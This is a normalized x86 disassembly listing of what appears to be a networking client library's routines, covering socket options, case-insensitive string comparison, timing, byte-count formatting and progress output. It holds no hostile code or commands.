cmp [ ebx + 0x2a8 ] 0x2
jne r-xdata
cmp eax 0x2732
jle r-xdata
push esi
call [ closesocket@IAT ]
call sub_40a9a0
mov ebx edx
mov edx [ esp + 0x1c ]
mov esi eax
mov eax [ esp + 0x18 ]
push edx
push eax
push ebx
push esi
call sub_40aa00
add esp 0x10
sub ebp eax
js r-xdata
push esi
call sub_40a580
add esp 0x4
test al al
jne r-xdata
cmp esi 0xffffffff
jne r-xdata
jmp r-xdata
push ebp
push esi
call sub_40a4c0
add esp 0x8
mov edi eax
xor ebp ebp
cmp eax 0x2734
jg r-xdata
mov ecx [ esp + 0x10 ]
mov [ esp + 0x18 ] esi
inc ecx
mov [ esp + 0x1c ] ebx
test edi edi
mov [ esp + 0x10 ] ecx
jne r-xdata
mov ecx [ esp + 0x48 ]
mov [ ecx ] 0x1
or edi 0xffffffff
mov eax [ esp + 0x44 ]
test eax eax
je r-xdata
mov ebx [ esp + 0x14 ]
mov edi [ esp + 0x10 ]
mov edx [ esp + 0x40 ]
pop edi
pop esi
pop ebp
mov [ edx ] 0xffffffff
mov eax 0x7
pop ebx
add esp 0x20
retn
mov eax [ esp + 0x40 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x38 ]
mov edx [ ecx ]
mov ecx [ edx + 0xc ]
mov edx [ esp + 0x10 ]
mov ecx [ ecx + edx * 4 ]
mov [ eax ] ecx
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn
mov [ eax ] esi
sub_40a7f0
mov eax [ esp + 0x4 ]
xor edx edx
push 0x4
mov ecx [ eax ]
lea eax [ esp + 0x8 ]
push eax
push 0x1
mov dl [ ecx + 0x18a ]
mov ecx [ esp + 0x14 ]
push 0x6
push ecx
mov [ esp + 0x18 ] edx
call [ setsockopt@IAT ]
retn
sub_40a820
push ebx
push ebp
push esi
mov ebx [ toupper@IAT ]
mov esi [ esp + 0x14 ]
push edi
mov edi [ esp + 0x14 ]
mov al [ edi ]
test al al
je r-xdata
movsx edx [ edi ]
push edx
call ebx
mov edi eax
movsx eax [ esi ]
push eax
call ebx
add esp 0x8
xor ecx ecx
cmp edi eax
pop edi
pop esi
sete cl
pop ebp
mov eax ecx
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
movsx eax al
push eax
call ebx
movsx ecx [ esi ]
push ecx
mov ebp eax
call ebx
add esp 0x8
cmp ebp eax
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
inc esi
test al al
jne r-xdata
sub_40a880
push ebx
push ebp
push esi
mov ebp [ esp + 0x18 ]
mov esi [ esp + 0x14 ]
push edi
mov edi [ esp + 0x14 ]
mov bl [ edi ]
test bl bl
je r-xdata
test ebp ebp
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
movsx eax [ edi ]
mov edi [ toupper@IAT ]
push eax
call edi
movsx ecx [ esi ]
push ecx
mov ebx eax
call edi
add esp 0x8
xor edx edx
cmp ebx eax
pop edi
pop esi
sete dl
pop ebp
mov eax edx
pop ebx
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
test ebp ebp
je r-xdata
movsx eax al
push eax
call [ toupper@IAT ]
movsx ecx bl
mov edx eax
push ecx
mov [ esp + 0x24 ] edx
call [ toupper@IAT ]
mov edx [ esp + 0x24 ]
add esp 0x8
cmp eax edx
jne r-xdata
mov bl [ edi + 0x1 ]
dec ebp
inc edi
inc esi
test bl bl
jne r-xdata
sub_40a910
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0xc ]
mov edx 0x1
shl edx cl
push edi
mov edi [ eax ]
test edi edx
pop edi
je r-xdata
mov eax 0x3
pop esi
retn
xor eax eax
pop esi
retn
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
mov eax [ eax + 0x10 ]
push eax
mov eax [ esp + 0x14 ]
push eax
push ecx
push esi
call edx
add esp 0x10
sub_40a960
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0xc ]
mov edx 0x1
shl edx cl
push edi
mov edi [ eax ]
test edi edx
pop edi
je r-xdata
mov eax 0x3
pop esi
retn
xor eax eax
pop esi
retn
mov edx [ eax + 0xc ]
test edx edx
je r-xdata
mov eax [ eax + 0x10 ]
push eax
push ecx
push esi
call edx
add esp 0xc
sub_40a9c0
push esi
call [ timeGetTime@IAT ]
mov ecx eax
mov eax 0x10624dd3
mul ecx
shr edx 0x6
mov esi [ esp + 0x8 ]
lea eax [ edx + edx * 4 ]
mov [ esi ] edx
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x3
sub ecx eax
lea eax [ ecx + ecx * 4 ]
lea eax [ eax + eax * 4 ]
lea ecx [ eax + eax * 4 ]
xor eax eax
shl ecx 0x3
mov [ esi + 0x4 ] ecx
pop esi
retn
sub_40aa00
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
sub ecx edx
mov eax 0x10624dd3
imul ecx
mov ecx [ esp + 0xc ]
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ esp + 0x4 ]
sub eax ecx
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea ecx [ eax + eax * 4 ]
lea eax [ edx + ecx * 8 ]
retn
sub_40aa40
push ecx
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
sub eax ecx
mov ecx [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0x10 ]
fild [ esp ]
sub ecx eax
mov [ esp + 0x8 ] ecx
fmul [ r--data ]
fild [ esp + 0x8 ]
faddp st1
pop ecx
retn
sub_40aa80
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi [ eax ]
mov [ esi + 0x1b0 ] 0x0
call sub_40ad20
mov al [ esi + 0x1e8 ]
add esp 0x4
test al 0x10
jne r-xdata
pop esi
retn
mov al [ esi + 0x1e0 ]
test al al
jne r-xdata
mov eax [ esi + 0x8 ]
push rw-data
push eax
call sub_40a470
add esp 0x8
sub_40ab10
mov eax [ esp + 0x8 ]
push esi
dec eax
cmp eax 0x6
ja r-xdata
pop esi
retn
jmp [ eax * 4 + jump_table_40ac0c ]
call sub_40a9a0
mov ecx [ esp + 0x8 ]
pop esi
mov [ ecx + 0x238 ] eax
mov [ ecx + 0x23c ] edx
retn
mov esi [ esp + 0x8 ]
mov ecx [ esi + 0x23c ]
mov edx [ esi + 0x238 ]
push ecx
push edx
call sub_40a9a0
push edx
push eax
call sub_40aa40
fstp [ esi + 0x208 ]
add esp 0x10
pop esi
retn
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x23c ]
mov ecx [ esi + 0x238 ]
push eax
push ecx
call sub_40a9a0
push edx
push eax
call sub_40aa40
fstp [ esi + 0x210 ]
add esp 0x10
pop esi
retn
mov esi [ esp + 0x8 ]
mov edx [ esi + 0x23c ]
mov eax [ esi + 0x238 ]
push edx
push eax
call sub_40a9a0
push edx
push eax
call sub_40aa40
fstp [ esi + 0x218 ]
add esp 0x10
pop esi
retn
mov esi [ esp + 0x8 ]
mov ecx [ esi + 0x23c ]
mov edx [ esi + 0x238 ]
push ecx
push edx
call sub_40a9a0
push edx
push eax
call sub_40aa40
fstp [ esi + 0x220 ]
add esp 0x10
pop esi
retn
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x234 ]
mov ecx [ esi + 0x230 ]
push eax
push ecx
call sub_40a9a0
push edx
push eax
call sub_40aa40
fstp [ esi + 0x228 ]
add esp 0x10
sub_40aca0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
mov [ eax + 0x1b8 ] edx
mov [ eax + 0x1bc ] ecx
test ecx ecx
jl r-xdata
and [ eax + 0x1e8 ] 0xffffffbf
retn
jg r-xdata
or [ eax + 0x1e8 ] 0x40
retn
test edx edx
jbe r-xdata
sub_40ace0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
mov [ eax + 0x1c0 ] edx
mov [ eax + 0x1c4 ] ecx
test ecx ecx
jl r-xdata
and [ eax + 0x1e8 ] 0xffffffdf
retn
jg r-xdata
or [ eax + 0x1e8 ] 0x20
retn
test edx edx
jbe r-xdata
sub_40ad20
sub esp 0x88
mov ecx [ esp + 0x8c ]
push ebx
push ebp
push esi
mov esi [ ecx ]
mov ebx 0x6
push edi
xor edi edi
mov eax [ esi + 0x2a0 ]
mov [ esp + 0x18 ] edi
cdq
idiv ebx
mov al [ esi + 0x1e8 ]
mov [ esp + 0x20 ] edi
test al 0x90
mov [ esp + 0x2c ] edi
mov [ esp + 0x28 ] edi
mov [ esp + 0x24 ] edi
mov ebp edx
jne r-xdata
call sub_40a9a0
mov ecx [ esi + 0x230 ]
mov ebx eax
mov eax [ esi + 0x234 ]
mov [ esp + 0x14 ] edx
push eax
push ecx
push edx
push ebx
call sub_40aa40
fst [ esi + 0x1f0 ]
add esp 0x10
call _ftol
mov edi eax
test edi edi
mov [ esp + 0x1c ] edi
jne r-xdata
mov al [ esi + 0x1e0 ]
test al al
jne r-xdata
cdq
push edx
mov edx [ esi + 0x1cc ]
push eax
mov eax [ esi + 0x1c8 ]
push edx
push eax
call sub_40d2f0
mov [ esi + 0x1f8 ] eax
mov [ esi + 0x1fc ] edx
test edi edi
mov eax edi
jne r-xdata
mov eax 0x1
mov eax [ esi + 0x1e8 ]
or al 0x80
mov [ esi + 0x1e8 ] eax
mov eax [ ecx + 0x90 ]
mov ecx [ ecx + 0x94 ]
mov edx eax
or edx ecx
je r-xdata
mov ecx [ esi + 0x1d4 ]
cdq
push edx
mov edx [ esi + 0x1d0 ]
push eax
push ecx
push edx
call sub_40d2f0
mov [ esi + 0x200 ] eax
mov eax [ esp + 0x14 ]
push eax
push ebx
mov [ esi + 0x204 ] edx
call sub_40aa70
mov ecx [ esi + 0x1b0 ]
add esp 0x8
cmp ecx eax
je r-xdata
mov eax 0x1
mov ecx [ esi + 0x8 ]
push rw-data
push ecx
call sub_40a470
add esp 0x8
push ecx
push eax
mov eax [ esi + 0x8 ]
push rw-data
push eax
call sub_40a470
add esp 0x10
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x88
retn
mov ecx [ esi + 0x1cc ]
mov edx [ esi + 0x1d4 ]
mov eax [ esi + 0x1c8 ]
mov edi [ esi + 0x1d0 ]
cmp ecx edx
mov [ esi + 0x1b0 ] ebx
jl r-xdata
mov eax edi
mov ecx edx
jg r-xdata
dec ecx
test ecx ecx
je r-xdata
mov ecx eax
mov [ esi + ebp * 8 + 0x240 ] eax
mov [ esi + ebp * 8 + 0x244 ] ecx
mov ecx [ esp + 0x14 ]
mov [ esi + ebp * 8 + 0x270 ] ebx
mov [ esi + ebp * 8 + 0x274 ] ecx
mov edx [ esi + 0x2a0 ]
inc edx
mov ecx 0x6
mov eax edx
mov [ esi + 0x2a0 ] edx
cmp eax 0x6
jge r-xdata
cmp eax edi
ja r-xdata
mov eax [ esi + 0x204 ]
mov ecx [ esi + 0x1fc ]
mov edx [ esi + 0x200 ]
mov edi [ esi + 0x1f8 ]
cmp eax ecx
jl r-xdata
cmp eax 0x6
jl r-xdata
mov edx edi
mov eax ecx
jg r-xdata
xor edi edi
cdq
mov ecx 0x6
idiv ecx
mov edi edx
jmp r-xdata
mov eax [ esi + 0x7c ]
test eax eax
je r-xdata
mov [ esi + 0x1d8 ] edx
mov [ esi + 0x1dc ] eax
cmp edx edi
ja r-xdata
mov edx [ esi + ebp * 8 + 0x240 ]
mov ebx [ esi + edi * 8 + 0x240 ]
mov eax [ esi + ebp * 8 + 0x244 ]
mov ecx [ esi + edi * 8 + 0x244 ]
sub edx ebx
sbb eax ecx
mov [ esp + 0x30 ] edx
mov [ esp + 0x34 ] eax
fild [ esp + 0x30 ]
fild [ esp + 0x10 ]
fmul [ r--data ]
fdivp st1
call _ftol
mov [ esi + 0x1d8 ] eax
mov [ esi + 0x1dc ] edx
jmp r-xdata
mov [ esp + 0x10 ] 0x1
mov edx [ esi + edi * 8 + 0x274 ]
mov eax [ esi + edi * 8 + 0x270 ]
mov ecx [ esp + 0x14 ]
push edx
push eax
push ecx
push ebx
call sub_40aa00
add esp 0x10
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
test cl 0x20
je r-xdata
fild [ esi + 0x1d0 ]
sub esp 0x8
mov ecx [ esi + 0x84 ]
fstp [ esp ]
fild [ esi + 0x1c0 ]
sub esp 0x8
fstp [ esp ]
fild [ esi + 0x1c8 ]
sub esp 0x8
fstp [ esp ]
fild [ esi + 0x1b8 ]
sub esp 0x8
fstp [ esp ]
push ecx
call eax
add esp 0x24
pop edi
pop esi
pop ebp
pop ebx
add esp 0x88
retn
mov ecx [ esi + 0x1e8 ]
test cl 0x10
jne r-xdata
test [ esi + 0x1e8 ] 0x40
je r-xdata
mov eax [ esi + 0x204 ]
mov ecx [ esi + 0x200 ]
test eax eax
jl r-xdata
mov ebx [ esp + 0x28 ]
mov eax [ esp + 0x24 ]
cmp ebx eax
jg r-xdata
mov eax [ esi + 0x1fc ]
mov ecx [ esi + 0x1f8 ]
test eax eax
jl r-xdata
jg r-xdata
test ebx ebx
jle r-xdata
mov ebx eax
jg r-xdata
mov ebx [ esi + 0x1c4 ]
mov edi [ esi + 0x1c0 ]
push eax
push ecx
push ebx
push edi
call sub_40d2f0
mov edx [ esi + 0x1d4 ]
mov [ esp + 0x28 ] eax
mov eax [ esi + 0x1d0 ]
push ebx
push edi
push edx
push eax
call sub_40d2f0
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov [ esp + 0x20 ] eax
test ecx ecx
jbe r-xdata
xor eax eax
mov ecx [ esp + 0x1c ]
mov eax ebx
sub eax ecx
jmp r-xdata
mov ebx [ esi + 0x1bc ]
mov edi [ esi + 0x1b8 ]
push eax
push ecx
push ebx
push edi
call sub_40d2f0
mov ecx [ esi + 0x1cc ]
mov edx [ esi + 0x1c8 ]
push ebx
push edi
push ecx
push edx
mov [ esp + 0x34 ] eax
call sub_40d2f0
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov [ esp + 0x18 ] eax
test ecx ecx
jbe r-xdata
mov edx [ esi + 0x1d0 ]
mov edi [ esi + 0x1d4 ]
mov edx [ esi + 0x1c0 ]
mov edi [ esi + 0x1c4 ]
jmp r-xdata
push eax
lea eax [ esp + 0x54 ]
push eax
call sub_40b250
lea ecx [ esp + 0x4c ]
push ebx
push ecx
call sub_40b250
mov edx [ esp + 0x2c ]
lea eax [ esp + 0x48 ]
push edx
push eax
call sub_40b250
mov eax [ esi + 0x1e8 ]
add esp 0x18
test al 0x20
je r-xdata
mov eax [ esi + 0x1c8 ]
mov ecx [ esi + 0x1cc ]
mov eax [ esi + 0x1b8 ]
mov ecx [ esi + 0x1bc ]
jmp r-xdata
test al 0x40
je r-xdata
mov ebp [ esp + 0x2c ]
jg r-xdata
add eax edx
adc ecx edi
mov edi eax
mov ebx ecx
js r-xdata
mov ecx [ esi + 0x1d0 ]
mov edx [ esi + 0x1c8 ]
mov eax [ esi + 0x1cc ]
add ecx edx
mov edx [ esi + 0x1d4 ]
push ebx
adc edx eax
push edi
push edx
push ecx
call sub_40d2f0
lea eax [ eax + eax * 4 ]
lea ebp [ eax + eax * 4 ]
shl ebp 0x2
jmp r-xdata
test edi edi
jbe r-xdata
mov ecx [ esi + 0x1dc ]
mov edx [ esi + 0x1d8 ]
lea eax [ esp + 0x8e ]
push eax
push ecx
push edx
call sub_40b340
add esp 0xc
lea ecx [ esp + 0x38 ]
lea edx [ esp + 0x44 ]
push eax
lea eax [ esp + 0x54 ]
push eax
push ecx
mov ecx [ esi + 0x204 ]
lea eax [ esp + 0x90 ]
push edx
mov edx [ esi + 0x200 ]
push eax
push ecx
push edx
call sub_40b340
mov ecx [ esi + 0x1fc ]
mov edx [ esi + 0x1f8 ]
add esp 0xc
push eax
lea eax [ esp + 0x8e ]
push eax
push ecx
push edx
call sub_40b340
mov ecx [ esi + 0x1d4 ]
mov edx [ esi + 0x1d0 ]
add esp 0xc
push eax
lea eax [ esp + 0x7e ]
push eax
push ecx
push edx
call sub_40b340
mov edx [ esi + 0x1cc ]
add esp 0xc
lea ecx [ esp + 0x74 ]
push eax
mov eax [ esp + 0x3c ]
push eax
mov eax [ esi + 0x1c8 ]
push ecx
push edx
push eax
call sub_40b340
mov ecx [ esp + 0x44 ]
add esp 0xc
lea edx [ esp + 0x90 ]
push eax
push ecx
push edx
push ebx
push edi
call sub_40b340
add esp 0xc
push eax
mov eax [ esi + 0x8 ]
push ebp
push rw-data
push eax
call sub_40a470
mov ecx [ esi + 0x8 ]
push ecx
call [ fflush@IAT ]
add esp 0x3c
sub_40b250
push edi
mov edi [ esp + 0xc ]
test edi edi
jne r-xdata
mov eax 0x91a2b3c5
imul edi
mov ecx edx
add ecx edi
sar ecx 0xb
mov edx ecx
shr edx 0x1f
add ecx edx
cmp ecx 0x63
jg r-xdata
mov eax [ esp + 0x8 ]
mov ecx [ rw-data ]
pop edi
mov [ eax ] ecx
mov edx [ rw-data ]
mov [ eax + 0x4 ] edx
mov cl [ rw-data ]
mov [ eax + 0x8 ] cl
retn
mov eax 0x2aaaaaab
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add edx eax
cmp edx 0x3e7
jg r-xdata
lea eax [ ecx + ecx * 4 ]
push esi
mov esi edi
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 8 ]
shl eax 0x4
sub esi eax
mov eax 0x88888889
imul esi
add edx esi
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov eax ecx
shl eax 0x4
sub eax ecx
lea eax [ edx + eax * 4 ]
mov esi eax
shl esi 0x4
sub esi eax
shl esi 0x2
sub edi esi
push edi
push edx
push ecx
mov ecx [ esp + 0x18 ]
push rw-data
push ecx
call sub_40a420
add esp 0x14
pop esi
pop edi
retn
push edx
mov edx [ esp + 0xc ]
push rw-data
push edx
call sub_40a420
add esp 0xc
pop edi
retn
lea eax [ edx + edx * 2 ]
shl eax 0x3
sub ecx eax
push ecx
mov ecx [ esp + 0xc ]
push edx
push rw-data
push ecx
call sub_40a420
add esp 0x10
pop edi
retn
sub_40b340
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
test esi esi
jg r-xdata
test esi esi
jg r-xdata
jl r-xdata
cmp esi 0x2
jg r-xdata
jl r-xdata
push esi
mov esi [ esp + 0x18 ]
push edi
push rw-data
push esi
call sub_40a420
add esp 0x10
mov eax esi
pop edi
pop esi
retn
cmp edi 0x186a0
jae r-xdata
push 0x0
push 0x40000000
push esi
push edi
call sub_40d3a0
mov ecx eax
mov eax 0xa000000b
imul ecx
add edx ecx
sar edx 0x1a
mov ecx edx
shr ecx 0x1f
add edx ecx
push edx
push 0x0
push 0x40000000
push esi
push edi
call sub_40d2f0
mov esi [ esp + 0x18 ]
push eax
push rw-data
push esi
call sub_40a420
add esp 0x10
mov eax esi
pop edi
pop esi
retn
jl r-xdata
push 0x0
push 0x400
push esi
push edi
call sub_40d2f0
mov esi [ esp + 0x14 ]
push edx
push eax
push rw-data
push esi
call sub_40a420
add esp 0x10
mov eax esi
pop edi
pop esi
retn
cmp edi 0x9c4000
jae r-xdata
push 0x0
push 0x100000
push esi
push edi
call sub_40d2f0
mov esi [ esp + 0x14 ]
push edx
push eax
push rw-data
push esi
call sub_40a420
add esp 0x10
mov eax esi
pop edi
pop esi
retn
cmp edi 0x71000000
jae r-xdata
test esi esi
jg r-xdata
jl r-xdata
push 0x0
push 0x100000
push esi
push edi
call sub_40d3a0
mov ecx eax
mov eax 0xa0003c01
imul ecx
add edx ecx
sar edx 0x10
mov eax edx
shr eax 0x1f
add edx eax
push edx
push 0x0
push 0x100000
push esi
push edi
call sub_40d2f0
mov esi [ esp + 0x18 ]
push eax
push rw-data
push esi
call sub_40a420
add esp 0x10
mov eax esi
pop edi
pop esi
retn
cmp edi 0x6400000
jae r-xdata
sub_40b490
mov ecx [ esp + 0x4 ]
mov eax [ ecx ]
mov dl [ eax + 0x168 ]
test dl dl
jne r-xdata
mov edx [ ecx + 0x1c0 ]
cmp edx 0x190
jge r-xdata
xor eax eax
retn
cmp edx 0x191
je r-xdata
xor eax eax
retn
mov ecx [ eax + 0x82fc ]
test ecx ecx
je r-xdata
cmp edx 0x197
jne r-xdata
mov eax 0x1
retn
cmp ecx edx
jne r-xdata
mov cl [ eax + 0x8309 ]
test cl cl
jne r-xdata
mov cl [ eax + 0x8308 ]
test cl cl
jne r-xdata
xor eax eax
retn
sub_40b4f0
mov edx [ esp + 0x8 ]
push ebx
push ebp
push esi
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
mov edi [ esp + 0x14 ]
not ecx
dec ecx
mov esi ecx
push esi
push edx
push edi
call sub_40a880
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
retn
mov al [ esi + edi ]
add esi edi
test al al
je r-xdata
mov edi [ strchr@IAT ]
push 0xd
push esi
call edi
add esp 0x8
test eax eax
jne r-xdata
mov edi [ _isctype@IAT ]
mov ebp [ esp + 0x1c ]
sub eax esi
mov ebx eax
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ecx
cmp ebx edi
jb r-xdata
push 0xa
push esi
call edi
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ _pctype@IAT ]
movsx eax al
mov edx [ ecx ]
mov al [ edx + eax * 2 ]
and eax 0x8
movsx edx al
push 0x8
push edx
call edi
add esp 0x8
jmp r-xdata
push edi
push ebp
push esi
call sub_40a880
add esp 0xc
test eax eax
jne r-xdata
push eax
push esi
call edi
add esp 0x8
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
retn
dec ebx
inc esi
cmp ebx edi
jae r-xdata
mov ecx [ __mb_cur_max@IAT ]
cmp [ ecx ] 0x1
jle r-xdata
sub_40b5d0
push esi
push edi
mov edi [ esp + 0xc ]
mov al [ edi + 0x108 ]
mov esi [ edi ]
test al al
je r-xdata
pop edi
xor eax eax
pop esi
retn
mov al [ esi + 0x82d0 ]
test al al
jne r-xdata
mov eax [ esi + 0x82d4 ]
test eax eax
je r-xdata
mov eax [ edi + 0x64 ]
push eax
call [ _strdup@IAT ]
add esp 0x4
mov [ esi + 0x82d4 ] eax
push eax
call [ free@IAT ]
add esp 0x4
sub_40b620
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
mov ebp [ edi ]
mov esi [ edi + 0x16c ]
test esi esi
mov eax [ ebp + 0x78 ]
mov [ edi + 0x618 ] eax
mov ecx [ ebp + 0x20 ]
mov [ edi + 0x61c ] ecx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov ebx [ esi + 0x7c ]
test ebx ebx
je r-xdata
mov ebp [ ebp + 0xf8 ]
cmp ebp 0x3
jne r-xdata
mov edx [ ebx ]
push edx
call [ free@IAT ]
push ebx
call [ free@IAT ]
add esp 0x8
mov [ esi + 0x7c ] 0x0
cmp ebp 0x4
jne r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ esi + 0x20 ]
mov ecx [ esi + 0x2c ]
mov edx [ esi + 0x24 ]
add eax ebx
adc ecx edx
mov [ edi + 0x78 ] eax
mov [ edi + 0x7c ] ecx
mov edx [ esi ]
push edx
call sub_404780
add esp 0x4
jmp r-xdata
mov al [ edi + 0x112 ]
test al al
jne r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ esi + 0x20 ]
mov ecx [ esi + 0x2c ]
mov edx [ esi + 0x24 ]
add eax ebx
adc ecx edx
mov [ edi + 0x78 ] eax
mov [ edi + 0x7c ] ecx
mov eax [ edi + 0x84 ]
cdq
mov ecx eax
mov eax [ edi + 0x80 ]
mov ebx edx
mov edi [ esi + 0x24 ]
cdq
sub eax ecx
sbb edx ebx
mov ebx [ esi + 0x20 ]
add eax ebx
adc edx edi
test edx edx
jg r-xdata
jl r-xdata
pop edi
pop esi
pop ebp
mov eax 0x34
pop ebx
retn
test eax eax
ja r-xdata
sub_40b700
sub esp 0x38
push ebx
push ebp
mov ebp [ esp + 0x44 ]
push esi
push edi
mov [ esp + 0x1c ] rw-data
mov eax [ ebp + 0x6c ]
mov ebx [ ebp ]
mov edi [ ebp + 0x64 ]
mov [ esp + 0x20 ] eax
mov eax [ ebp + 0x16c ]
mov esi [ ebx + 0xf8 ]
test eax eax
mov [ esp + 0x4c ] edi
mov [ esp + 0x18 ] esi
jne r-xdata
mov [ esp + 0x10 ] eax
push 0x80
call [ malloc@IAT ]
mov edx eax
add esp 0x4
test edx edx
mov [ esp + 0x10 ] edx
jne r-xdata
mov eax [ ebx + 0xfc ]
mov ecx rw-data
test eax eax
je r-xdata
mov al [ ebx + 0x170 ]
test al al
je r-xdata
mov ecx 0x20
xor eax eax
mov edi edx
[ edi ]
mov edi [ esp + 0x4c ]
mov [ ebp + 0x16c ] edx
jmp r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1b
pop ebx
add esp 0x38
retn
mov al [ ebp + 0x113 ]
test al al
jne r-xdata
mov [ esp + 0x14 ] eax
jmp r-xdata
mov esi 0x4
mov [ esp + 0x18 ] esi
mov al [ ebp + 0x8 ]
mov [ ebp + 0x104 ] 0x0
test al 0x14
je r-xdata
mov [ esp + 0x14 ] ecx
lea eax [ esi - 0x1 ]
cmp eax 0x4
ja r-xdata
push rw-data
push ebx
call sub_40c450
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x14 ]
push ecx
push edx
push ebp
call sub_40c4a0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp + 0x148 ]
test eax eax
je r-xdata
jmp [ eax * 4 + jump_table_40c43c ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x38
retn
mov al [ ebx + 0x8309 ]
test al al
jne r-xdata
push eax
call [ free@IAT ]
add esp 0x4
mov [ ebp + 0x148 ] 0x0
mov [ esp + 0x14 ] rw-data
jmp r-xdata
mov [ esp + 0x14 ] rw-data
jmp r-xdata
mov [ esp + 0x14 ] rw-data
jmp r-xdata
mov eax [ ebp + 0x158 ]
push eax
call sub_405760
mov ecx [ ebp + 0x15c ]
mov [ ebp + 0x158 ] 0x0
push ecx
call sub_405760
mov al [ ebp + 0x10e ]
add esp 0x8
test al al
mov [ ebp + 0x15c ] 0x0
jne r-xdata
cmp esi 0x1
je r-xdata
push rw-data
push ebx
call sub_40c450
add esp 0x8
test eax eax
jne r-xdata
cmp esi 0x1
je r-xdata
mov esi 0x5
mov [ esp + 0x14 ] rw-data
mov [ esp + 0x18 ] esi
mov [ ebp + 0x113 ] 0x1
mov [ esp + 0x1c ] rw-data
mov [ ebp + 0x10e ] 0x0
mov [ esp + 0x1c ] rw-data
jmp r-xdata
test al al
je r-xdata
push rw-data
push ebx
call sub_40c450
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp + 0x160 ]
push edx
call sub_405760
mov eax [ ebp + 0x8 ]
add esp 0x4
and eax 0x8
je r-xdata
mov cl [ ebx + 0x82d0 ]
test cl cl
jne r-xdata
push rw-data
push ebx
call sub_40c450
add esp 0x8
test eax eax
je r-xdata
push rw-data
push rw-data
push eax
call sub_40b4f0
add esp 0xc
mov [ ebp + 0x10e ] al
mov [ esp + 0x1c ] rw-data
jmp r-xdata
test eax eax
jne r-xdata
cmp [ ebp + 0x74 ] 0x1bb
je r-xdata
lea esi [ eax + 0x5 ]
mov al [ eax + 0x5 ]
test al al
je r-xdata
mov al [ ebp + 0x10a ]
mov ecx rw-data
test al al
jne r-xdata
cmp [ ebp + 0x74 ] 0x50
jne r-xdata
mov al [ ebp + 0x10a ]
mov ecx rw-data
test al al
jne r-xdata
mov al [ esi ]
mov edi esi
test al al
je r-xdata
mov edi [ _isctype@IAT ]
test al al
mov eax rw-data
jne r-xdata
mov ecx rw-data
test al al
mov eax rw-data
jne r-xdata
mov ecx rw-data
mov al [ ebp + 0x107 ]
test al al
je r-xdata
mov ecx [ __mb_cur_max@IAT ]
cmp [ ecx ] 0x1
jle r-xdata
mov edx [ _pctype@IAT ]
movsx ecx al
mov eax [ edx ]
mov al [ eax + ecx * 2 ]
and eax 0x8
movsx eax al
push 0x8
push eax
call edi
add esp 0x8
jmp r-xdata
xor edx edx
mov dx [ ebp + 0x74 ]
push edx
push ecx
push edi
push eax
push rw-data
call sub_40a280
add esp 0x14
mov eax rw-data
push ecx
push edi
push eax
push rw-data
call sub_40a280
add esp 0x10
jmp r-xdata
mov eax rw-data
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x10 ]
cmp edi 0x3
jne r-xdata
mov al [ ebx + 0x161 ]
test al al
jne r-xdata
mov ecx [ _pctype@IAT ]
movsx eax [ edi ]
mov edx [ ecx ]
mov al [ edx + eax * 2 ]
and eax 0x8
movsx edx [ edi ]
push 0x8
push edx
call [ _isctype@IAT ]
add esp 0x8
jmp r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1b
pop ebx
add esp 0x38
retn
test eax eax
mov [ ebp + 0x160 ] eax
jne r-xdata
push rw-data
push ebx
call sub_40c450
add esp 0x8
test eax eax
jne r-xdata
mov edx [ ebx + 0xb8 ]
lea ecx [ esi + 0x8 ]
push ecx
push edx
push esi
call sub_404830
add esp 0xc
test eax eax
jne r-xdata
test [ ebp + 0x8 ] 0x8
jne r-xdata
